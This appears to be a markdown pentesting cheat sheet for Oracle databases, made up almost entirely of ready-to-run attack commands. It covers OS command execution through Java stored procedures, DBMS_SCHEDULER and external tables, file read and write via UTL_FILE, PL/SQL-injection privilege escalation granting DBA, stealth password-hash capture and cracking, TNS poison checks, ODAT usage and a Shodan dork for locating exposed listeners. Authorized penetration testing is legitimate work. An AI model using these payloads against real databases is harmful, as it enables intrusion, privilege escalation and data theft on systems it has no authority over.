# ‚òï Oracle Pentesting Checklist & Commands

## üéØ What am I realistically expecting to find here?

‚≠ê After pentesting Oracle, I realistically expect to find:

- [ ] Exposed listener ports and service info
- [ ] Misconfigured instant client or TNS services
- [ ] TNS Poison attacks for MitM
- [ ] Stealth password bruteforcing
- [ ] Remote Code Execution via Java stored procedures, scheduler, or external tables
- [ ] File read/write access via UTL_FILE
- [ ] Privilege escalation via PL/SQL injection

---

## ‚úÖ Oracle Pentest Checklist

- [ ] **Instant Client Setup (Attacker)**
  - Install and configure Oracle Instant Client.
    ```
    unzip instantclient-*.zip -d /opt/oracle/
    ln -s libclntsh.so.12.1 libclntsh.so
    ldconfig
    ```
  - Add environment variables:
    ```
    export PATH=$PATH:/opt/oracle/instantclient_12_1
    export LD_LIBRARY_PATH=/opt/oracle/instantclient_12_1
    ```
  - Verify SQLPlus:
    ```
    sqlplus <user>/<pass>@<IP>/<SID>
    ```

- [ ] **Metasploit Setup**
  - Install ruby-oci8 for Oracle modules.
    ```
    apt-get install libgmp-dev
    gem install ruby-oci8
    ```

---

## ‚úÖ TNS Poison Attack

- [ ] **Check Vulnerability**
  - MSF module:
    ```
    use auxiliary/scanner/oracle/tnspoison_checker
    ```
  - ODAT test:
    ```
    ./odat.py tnspoison -s <IP> -p <PORT> -d <SID> --test-module
    ```

---

## ‚úÖ Stealth Password Brute Force

- [ ] **Versions Vulnerable:** 11.1.0.6‚Äì11.2.0.3
- [ ] **Nmap Module**
  - Grab hashed credentials.
    ```
    nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g <IP>
    ```
  - Crack with john:
    ```
    john hashes.txt
    ```

---

## ‚úÖ RCE - Java Stored Procedure

- [ ] **Create Java Class**
    ```
    create or replace and resolve java source named "oraexec" as
    import java.lang.*;
    import java.io.*;
      public class oraexec
      {
        public static void execCommand(String command) throws IOException
        {
          Runtime.getRuntime().exec(command);
        }
      }
    /
    ```
- [ ] **Create PL/SQL Wrapper**
    ```
    create or replace procedure javacmd(p_command varchar2) as language java name 'oraexec.execCommand(java.lang.String)'; /
    ```
- [ ] **Execute Command**
    ```
    exec javacmd('command');
    ```

---

## ‚úÖ RCE - Scheduler

- [ ] **Execute via DBMS_SCHEDULER**
    ```
    exec DBMS_SCHEDULER.create_program('HACK','EXECUTABLE','cmd.exe /c echo owned >> C:/pwned.txt',0,TRUE);
    exec DBMS_SCHEDULER.create_job(job_name=>'HACKJOB',program_name=>'HACK',enabled=>TRUE);
    ```

---

## ‚úÖ RCE - External Tables

- [ ] **Check Directories**
    ```
    SELECT TABLE_NAME FROM ALL_TAB_PRIVS WHERE privilege='EXECUTE';
    ```
- [ ] **Write Batch File**
    ```
    declare
     f utl_file.file_type;
     s varchar2(200) := 'echo PWNED >> C:/owned.txt';
    begin
     f := utl_file.fopen('DIR','hack.bat','W');
     utl_file.put_line(f,s);
     utl_file.fclose(f);
    end;
    /
    ```
- [ ] **Execute via External Table**
    ```
    CREATE TABLE EXTT (line varchar2(256))
    ORGANIZATION EXTERNAL
    (TYPE oracle_loader
      DEFAULT DIRECTORY DIR
      ACCESS PARAMETERS
      ( RECORDS DELIMITED BY NEWLINE
        FIELDS TERMINATED BY ',')
      LOCATION ('hack.bat'))
    /
    SELECT * from EXTT;
    ```

---

## ‚úÖ File Read/Write with UTL_FILE

- [ ] **Read a File**
    ```
    declare
    f utl_file.file_type;
    sBuffer varchar2(8000);
    begin
    f := utl_file.fopen('DIR','boot.ini','r');
    loop
      utl_file.get_line(f,sBuffer);
      dbms_output.put_line(sBuffer);
    end loop;
    exception when no_data_found then
      utl_file.fclose(f);
    end;
    /
    ```

- [ ] **ODAT for File Read/Write**
    ```
    ./odat.py utlfile -s <IP> -d <SID> -U <user> -P <pass> --getFile "C:/test" out.txt
    ./odat.py externaltable -s <IP> -d <SID> -U <user> -P <pass> --getFile "C:/test" out.txt
    ```

---

## ‚úÖ Privilege Escalation

- [ ] **Classic PL/SQL Injection Example**
    ```
    exec ctxsys.driload.validate_stmt('grant dba to scott');
    ```
- [ ] **Custom Privilege Grant**
    ```
    CREATE OR REPLACE FUNCTION F1
    RETURN NUMBER AUTHID CURRENT_USER
    IS
    PRAGMA AUTONOMOUS_TRANSACTION;
    BEGIN
    EXECUTE IMMEDIATE 'GRANT DBA TO TEST';
    COMMIT; RETURN(1); END;
    /
    exec sys.kupw$WORKER.main('x','YY'' and 1=test1.f1 --');
    ```
- [ ] **DBMS_JVM_EXP_PERMS for Java IO Privilege**
    ```
    DECLARE
       POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;
       CURSOR C1 IS SELECT
    'GRANT','GREMLIN','SYS','java.io.FilePermission','<ALL FILES>','execute','ENABLED' FROM DUAL;
      BEGIN
      OPEN C1;
      FETCH C1 BULK COLLECT INTO POL;
      CLOSE C1;
      DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);
    END;
    /
    ```
    ```
    select dbms_java.runjava('oracle/aurora/util/Wrapper c:\\windows\\system32\\cmd.exe /c echo 123 >c:\\hack') from dual;
    ```

---

## ‚úÖ Useful Tools

- [ODAT](https://github.com/quentinhardy/odat)
  - Comprehensive Oracle pentesting tool.
- [SQLPlus]
  - For direct Oracle connections.
- [Metasploit]
  - Auxiliary and exploit modules for Oracle DB.

---

## ‚úÖ Shodan Dork

- `port:1521 oracle`
